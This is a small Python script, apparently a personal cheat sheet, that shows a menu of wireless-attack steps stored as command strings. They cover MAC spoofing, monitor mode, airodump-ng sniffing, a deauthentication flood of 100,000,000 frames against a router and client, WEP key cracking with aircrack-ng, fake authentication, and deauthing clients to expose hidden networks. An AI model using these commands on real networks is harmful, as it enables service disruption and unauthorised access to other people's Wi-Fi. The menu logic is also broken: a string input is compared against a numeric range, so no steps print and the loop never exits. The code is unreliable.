
allls = ["change mac","chmod Monitor","packet sniffing default 2.4","pckt sniffing 2.4 & 5","target sniffing","deauthAttack","crackWEP","crackWEPnotraffic", "hidden network"]
macls = ["ifconfig <if> down","ifconfig <if> hw ether xX:xx:xx:xx:xx:xx","ifconfig <if> up"]
monitorMod = ["airmon-ng start <interface>","iwconfig","ifconfig <if> down","airmon-ng check kill (kills network manager)","iwconfig <if> mode monitor","ifconfig <if> up","iwconfig", "OR", "airmon-ng wlan0 start"]
pcktsniff = ["see chmod Monitor","iwconfig", "airodump-ng <if>"]
abg = ["see chmod Monitor","iwconfig", "airodump-ng --band abg <if>"]
trgtsnif = ["airodump-ng --bssid MAC --channel CH (--write test) <if> \t#write test is optional"]
deauth = ["aireplay-ng --deauth 100000000 -a RouterMAC -c DeviceMAc <if>"]
wep =["perform target sniffing and save files","gather enough data","find saved file xx-01.cap","aircrack-ng xx-01.cap","you should be able to see KEY FOUND[password, ASCII] ","remove ':' from password"]
notraffic =["we need to associate with the router", "run target sniffing and save file on different terminal", "aireplay-ng --fakeauth 0 -a RouterMAC -h [unspec ifconfig MAC (first 12 digits)]MAC <if>","next check packet injection"]
hidden_network = ["Set up monitor mode", "airodump-ng <if>", "Identify networks without ESSID", "airodump-ng <if> --channel <number> \t#1) capture traffic for hidden net, 2)the number of channel that the hidden network is running", "aireplay-ng -0 3 -a <MAC> <if> or aireplay-ng --deauth 100000000 -a <RouterMAC> -c <DeviceMAC> <if> \t#Deauthenticate clients connected to the network"]


#Dictionary
menu = {"change mac":macls,"chmod Monitor": monitorMod,"packet sniffing default 2.4":pcktsniff,"pckt sniffing 2.4 & 5":abg,"target sniffing":trgtsnif,"deauthAttack":deauth
,"crackWEP":wep,"crackWEPnotraffic":notraffic, "hidden network":hidden_network}


ans=""

while ans != "exit":
		count = 0
		for i in allls:
			print(count, i)
			count += 1
		print("\n")		
		ans  = input("input 0-8: ")
		print("\n")		
		print(" ----------------------------------------")
		print("\n")
		print("Steps: \n")
		if ans in range(0,9):
			for j in menu[allls[int(ans)]]:
				print("\t " + j)
		print("\n")		
		ans = 1
		
		
#TODO Add target 
